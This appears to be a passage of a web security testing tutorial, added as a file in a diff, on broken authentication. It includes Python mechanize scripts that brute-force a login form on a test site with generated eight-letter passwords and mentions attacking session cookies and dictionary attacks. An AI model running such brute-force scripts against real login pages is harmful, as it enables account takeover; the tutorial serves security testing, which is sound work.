@@ -1,0 +1,95 @@
+Broken authentication
+When authentication functions that help to authenticate users to the application are not implemented correctly, that may allow hackers to compromise passwords or session IDs, or to exploit other implementation flaws using other users' credentials. These types of flaws are known as broken authentication.
+
+We can use mechanize scripts to check the authentication mechanism in an application.
+
+With this, we have to check the account management functions like account creation, change password, and recover password. We could also write customized brute-force and dictionary attack scripts to check the login mechanism of the application.
+
+We can generate all possible passwords with a range of characters in them as follows:
+
+
+
+# import required modules
+from itertools import combinations  
+ 
+from string import ascii_lowercase 
+ 
+# Possible password list 
+ 
+passwords = (p for p in combinations(ascii_lowercase,8)) 
+ 
+for p in passwords: 
+ 
+    print ''.join(p) 
+
+
+Later, we can use these passwords in a brute-force attack as follows:
+
+
+import mechanize 
+ 
+from itertools import combinations  
+ 
+from string import ascii_lowercase 
+ 
+ 
+ 
+url = "http://www.webscantest.com/login.php" 
+ 
+browser = mechanize.Browser() 
+ 
+attackNumber = 1 
+ 
+ 
+ 
+# Possible password list 
+ 
+passwords = (p for p in combinations(ascii_lowercase,8)) 
+ 
+for p in passwords: 
+ 
+    browser.open(url) 
+ 
+    browser.select_form(nr=0) 
+ 
+    browser["login"] = 'testuser' 
+ 
+    browser["passwd"] = ''.join(p) 
+ 
+    res = browser.submit() 
+ 
+    content = res.read() 
+ 
+    # Print  response code 
+ 
+    print res.code 
+ 
+ 
+     # Write response to file 
+ 
+    output = open('response/'+str(attackNumber)+'.txt', 'w') 
+ 
+    output.write(content) 
+ 
+    output.close() 
+ 
+    attackNumber += 1 
+
+
+
+Here we can analyze the response and confirm the login. For that we have to search the response for the error messages. If no error messages are found in the response it will be a successful login.
+
+In the preceding example, we can check if we were taken back to the login page or not. If we are taken to the login page, the login failed:
+
+
+
+
+    # check if we were taken back to the login page or not 
+ 
+    if content.find('<input type="password" name="passwd" />') > 0: 
+ 
+         print "Login failed" 
+
+
+
+We can also modify this script to brute-force predictable, or less random session cookies. For that we have to analyze authentication cookie patterns. We can also replace the password with the words in a dictionary. The code will be the same as we have done for injections, The attack vector will be replaced with the words in the dictionary file provided.
